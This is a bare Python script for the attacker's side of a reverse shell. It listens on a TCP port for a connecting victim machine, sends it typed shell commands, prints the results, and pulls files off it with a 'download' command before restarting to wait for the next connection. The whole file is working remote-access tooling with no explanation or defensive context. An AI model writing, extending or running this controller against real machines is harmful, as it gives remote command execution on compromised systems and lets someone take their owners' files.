import socket
import sys
import tqdm
import os

BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

def recv_file():
    received = target.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    # convert to integer
    # filesize = int(filesize)
    
    # progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = target.recv(BUFFER_SIZE)
            if not bytes_read:    
                # nothing is received
                # file transmitting is done
                print("file received")
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            # progress.update(len(bytes_read))

    # close the client socket
    target.close()
    

def shell():
    while True:
        command = input("* Shell#~%s: " %str(ip))
        target.send(command.encode())
        if command == "q":
            break
        elif command[0:8] == "download":
            recv_file()
            print("Connecting again...")
            os.execl(sys.executable, sys.executable, *sys.argv)

        elif command[:2] == "cd" and len(command) >1:
            continue
        else:
            result = target.recv(1024)
            print(result.decode())

def server():
    global s
    global ip 
    global target

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("IP_ADDRESS_ROUTER", 12345))
    s.listen(5)
    print("[+] Listening for Incoming connections: ")
    target, ip = s.accept()
    print("[+] Connection established from: %s" %str(ip))

server()
shell()
s.close()
